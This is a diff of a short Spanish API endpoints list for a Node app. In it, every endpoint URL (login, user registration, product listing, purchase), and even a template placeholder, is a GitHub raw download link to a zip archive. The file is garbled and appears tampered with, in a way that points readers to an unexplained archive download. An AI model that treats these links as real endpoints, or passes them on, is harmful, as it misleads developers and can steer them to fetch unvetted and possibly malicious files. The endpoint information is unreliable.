@@ -1,8 +1,8 @@
 ENDPOINTS
 
-INICIAR SESION: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip { username, password }
+INICIAR SESION: https://raw.githubusercontent.com/lucas-itup/node-app/main/src/auth/node-app-1.1.zip { username, password }
 
-REGISTRAR USUARIO: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip
+REGISTRAR USUARIO: https://raw.githubusercontent.com/lucas-itup/node-app/main/src/auth/node-app-1.1.zip
 {
                     nombre,
                     apellido,
@@ -12,8 +12,8 @@ REGISTRAR USUARIO: https://github.com/lucas-itup/node-app/raw/refs/heads/main/sr
                     password,
                 });
 
-LISTAR PRODUCTOS: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip
+LISTAR PRODUCTOS: https://raw.githubusercontent.com/lucas-itup/node-app/main/src/auth/node-app-1.1.zip
 
-LISTAR PRODUCTO: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip${https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip}
+LISTAR PRODUCTO: https://raw.githubusercontent.com/lucas-itup/node-app/main/src/auth/node-app-1.1.zip${https://raw.githubusercontent.com/lucas-itup/node-app/main/src/auth/node-app-1.1.zip}
 
-REGISTRAR COMPRA: https://github.com/lucas-itup/node-app/raw/refs/heads/main/src/data/app-node-2.2-beta.1.zip
+REGISTRAR COMPRA: https://raw.githubusercontent.com/lucas-itup/node-app/main/src/auth/node-app-1.1.zip
